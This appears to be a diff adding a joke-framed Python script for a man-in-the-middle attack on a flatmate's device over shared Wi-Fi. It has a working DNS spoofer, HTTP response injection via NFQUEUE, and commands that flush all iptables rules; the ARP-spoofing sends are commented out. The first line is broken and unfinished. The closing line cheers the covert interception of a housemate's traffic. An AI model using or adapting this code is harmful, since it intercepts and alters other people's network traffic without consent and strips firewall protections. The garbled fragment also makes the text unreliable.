@@ -1,0 +1,225 @@
+hack_name:MITM_flathouse(duration = 
+import time
+import scapy.all as scapy
+import netfilterqueue
+import os
+import random
+import re
+import base64
+from datetime import datetime, timedelta
+
+# --- Configuration Section ---
+FLAT_NETWORK_ID = "MyCozyFlat_WiFi"
+TARGET_DEVICE_IP = "192.168.1.105"  # Example: Smart TV, Laptop, IoT toaster
+SPOOF_TARGET_URL = "http://example.com/ads" # URL to replace or redirect
+REPLACEMENT_CONTENT_PATH = "/tmp/cat_memes.html" # Path to your glorious cat meme HTML
+FAKE_DNS_SERVER = "8.8.4.4" # Google's secondary DNS
+MITM_LOG_FILE = "/var/log/mitm_flathouse.log"
+CRITICAL_SERVICES = ["bankofgranny.com", "onlinepharmacy.net"] # Don't mess with these (for comedic effect)
+
+# --- Library Mockups (for simulation purposes) ---
+class ArpSpoofer:
+    def __init__(self, target_ip, gateway_ip):
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.target_mac = self._get_mac(target_ip)
+        self.gateway_mac = self._get_mac(gateway_ip)
+        print(f"[{datetime.now()}] ARP Spoofer initialized: Target={self.target_mac}, Gateway={self.gateway_mac}")
+
+    def _get_mac(self, ip):
+        time.sleep(0.1)
+        return f"00:11:22:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
+
+    def spoof(self):
+        print(f"[{datetime.now()}] Sending ARP spoof packets to {self.target_ip} and {self.gateway_ip}...")
+        # scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip))
+        # scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip))
+        time.sleep(0.5)
+        print(f"[{datetime.now()}] ARP spoofing in progress.")
+
+    def restore(self):
+        print(f"[{datetime.now()}] Restoring ARP table for {self.target_ip} and {self.gateway_ip}...")
+        # scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=4)
+        # scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), count=4)
+        time.sleep(0.5)
+        print(f"[{datetime.now()}] ARP table restored.")
+
+class PacketInterceptor:
+    def __init__(self, queue_num):
+        self.queue_num = queue_num
+        self.queue = netfilterqueue.NetfilterQueue()
+        print(f"[{datetime.now()}] Packet Interceptor initialized for queue {queue_num}.")
+
+    def start(self, callback):
+        print(f"[{datetime.now()}] Starting packet interception...")
+        self.queue.bind(self.queue_num, callback)
+        try:
+            # self.queue.run() # This would run indefinitely
+            print(f"[{datetime.now()}] Interception loop started. (Simulated run for 5 seconds)")
+            time.sleep(5) # Simulate running for a short period
+        except KeyboardInterrupt:
+            print(f"[{datetime.now()}] Interception manually stopped.")
+        finally:
+            self.queue.unbind()
+            print(f"[{datetime.now()}] Packet interception stopped.")
+
+class DNSSpoofer:
+    def __init__(self, original_dns, spoofed_ip):
+        self.original_dns = original_dns
+        self.spoofed_ip = spoofed_ip
+        print(f"[{datetime.now()}] DNS Spoofer initialized: Original DNS={original_dns}, Spoofed IP={spoofed_ip}.")
+
+    def spoof_dns_query(self, packet, url_to_spoof):
+        if packet.haslayer(scapy.DNSQR) and url_to_spoof in packet[scapy.DNSQR].qname.decode():
+            print(f"[{datetime.now()}] Intercepted DNS query for {packet[scapy.DNSQR].qname.decode()}")
+            spoofed_response = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
+                               scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
+                               scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, rcode=0, \
+                                         qd=packet[scapy.DNSQR], an=scapy.DNSRR(rrname=packet[scapy.DNSQR].qname, rdata=self.spoofed_ip))
+            print(f"[{datetime.now()}] Spoofed DNS response: {packet[scapy.DNSQR].qname.decode()} -> {self.spoofed_ip}")
+            return spoofed_response
+        return None
+
+# --- Core MITM Functions ---
+
+def enable_ip_forwarding():
+    print(f"[{datetime.now()}] Enabling IP forwarding...")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print(f"[{datetime.now()}] IP forwarding enabled.")
+
+def disable_ip_forwarding():
+    print(f"[{datetime.now()}] Disabling IP forwarding...")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print(f"[{datetime.now()}] IP forwarding disabled.")
+
+def setup_iptables_rules(queue_num):
+    print(f"[{datetime.now()}] Setting up IPTables rules...")
+    # Clear existing rules for simplicity in simulation
+    os.system("sudo iptables -F")
+    os.system("sudo iptables -X")
+    os.system("sudo iptables -Z")
+
+    # Redirect HTTP traffic to our NetfilterQueue
+    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
+    os.system(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {queue_num}") # For local traffic
+    os.system(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {queue_num}") # For local traffic
+    print(f"[{datetime.now()}] IPTables rules set. All HTTP/HTTPS traffic to queue {queue_num}.")
+
+def flush_iptables_rules():
+    print(f"[{datetime.now()}] Flushing IPTables rules...")
+    os.system("sudo iptables -F")
+    os.system("sudo iptables -X")
+    print(f"[{datetime.now()}] IPTables rules flushed.")
+
+def create_replacement_content(file_path):
+    # Generates a humorous HTML page with cat memes
+    print(f"[{datetime.now()}] Creating replacement content at {file_path}...")
+    html_content = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Fluffy Ad Block Activated!</title>
+        <style>
+            body { font-family: sans-serif; text-align: center; background-color: #f0f8ff; color: #333; }
+            h1 { color: #8a2be2; }
+            img { max-width: 80%; height: auto; border: 5px solid #ff69b4; border-radius: 10px; margin: 20px 0; }
+            p { font-size: 1.2em; }
+        </style>
+    </head>
+    <body>
+        <h1>Enjoying your internet? Not without more cats!</h1>
+        <p>Your scheduled programming has been temporarily interrupted for a vital public service announcement:</p>
+        <img src="https://cataas.com/cat?width=400&height=300&t=1" alt="Cute Cat 1">
+        <p>Due to excessive ad traffic, we've redirected you to a more purr-fect experience.</p>
+        <img src="https://cataas.com/cat?width=500&height=350&t=2" alt="Cute Cat 2">
+        <p>Thank you for your understanding. Your internet quality has been significantly enhanced.</p>
+        <p>P.S. Meow!</p>
+    </body>
+    </html>
+    """
+    with open(file_path, "w") as f:
+        f.write(html_content)
+    print(f"[{datetime.now()}] Replacement content created successfully.")
+
+def packet_callback(packet, dns_spoofer, spoof_target_url, replacement_content_path):
+    payload = packet.get_payload()
+    scapy_packet = scapy.IP(payload)
+
+    # Log all traffic (simulated)
+    with open(MITM_LOG_FILE, "a") as log:
+        log.write(f"[{datetime.now()}] Intercepted packet from {scapy_packet[scapy.IP].src} to {scapy_packet[scapy.IP].dst}\n")
+
+    # DNS Spoofing
+    spoofed_dns = dns_spoofer.spoof_dns_query(scapy_packet, spoof_target_url.split('/')[2]) # Extract domain
+    if spoofed_dns:
+        packet.set_payload(bytes(spoofed_dns))
+        packet.accept()
+        return
+
+    # HTTP/HTTPS modification (simplified for HTTP only for demonstration)
+    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+        if scapy_packet[scapy.TCP].dport == 80: # HTTP traffic
+            http_payload = scapy_packet[scapy.Raw].load.decode(errors='ignore')
+            
+            # Check for critical services to avoid
+            for service in CRITICAL_SERVICES:
+                if service in http_payload:
+                    print(f"[{datetime.now()}] Warning: Detected critical service ({service}). Not modifying this packet.")
+                    packet.accept()
+                    return
+
+            if f"GET {spoof_target_url}" in http_payload or f"Host: {spoof_target_url.split('/')[2]}" in http_payload:
+                print(f"[{datetime.now()}] Detected request to {spoof_target_url}. Injecting cat memes!")
+                
+                with open(replacement_content_path, "rb") as f:
+                    new_content = f.read()
+
+                # Craft a fake HTTP response
+                response_header = b"HTTP/1.1 200 OK\r\n"
+                response_header += b"Content-Type: text/html\r\n"
+                response_header += f"Content-Length: {len(new_content)}\r\n".encode()
+                response_header += b"\r\n"
+
+                spoofed_response = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
+                                   scapy.TCP(dport=scapy_packet[scapy.TCP].sport, sport=scapy_packet[scapy.TCP].dport, ack=scapy_packet[scapy.TCP].seq + len(scapy_packet[scapy.Raw].load), seq=scapy_packet[scapy.TCP].ack, flags="PA") / \
+                                   (response_header + new_content)
+                
+                packet.set_payload(bytes(spoofed_response))
+                packet.accept()
+                print(f"[{datetime.now()}] Cat memes injected successfully!")
+                return
+    
+    packet.accept() # Let other packets pass through
+
+def hack_flathouse_mitm(flat_network_id, target_device_ip, spoof_target_url):
+    print(f"[{datetime.now()}] Starting Man-in-the-Middle attack on '{flat_network_id}'...")
+    GATEWAY_IP = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
+    if not GATEWAY_IP:
+        raise ValueError("Could not determine default gateway IP. Is your network configured?")
+    print(f"[{datetime.now()}] Detected Gateway IP: {GATEWAY_IP}")
+
+    QUEUE_NUMBER = 0 # NetfilterQueue number
+    enable_ip_forwarding()
+    setup_iptables_rules(QUEUE_NUMBER)
+    create_replacement_content(REPLACEMENT_CONTENT_PATH)
+    spoofer = ArpSpoofer(target_device_ip, GATEWAY_IP)
+    dns_spoofer = DNSSpoofer(FAKE_DNS_SERVER, "10.0.0.1") 
+
+    print(f"[{datetime.now()}] Starting continuous ARP spoofing...")
+    spoofer.spoof() # Initial spoof
+
+
+    interceptor = PacketInterceptor(QUEUE_NUMBER)
+    try:
+        # Pass parameters to the callback function
+        interceptor.start(lambda pkt: packet_callback(pkt, dns_spoofer, spoof_target_url, REPLACEMENT_CONTENT_PATH))
+    except Exception as e:
+        print(f"[{datetime.now()}] An error occurred during interception: {e}")
+    finally:
+        print(f"[{datetime.now()}] Cleaning up MITM attack...")
+        spoofer.restore()
+        flush_iptables_rules()
+        disable_ip_forwarding()
+        print(f"[{datetime.now()}] MITM attack cleanup complete.")
+
+Hack successful! Your flatmate's internet is now 100% more fluffy.
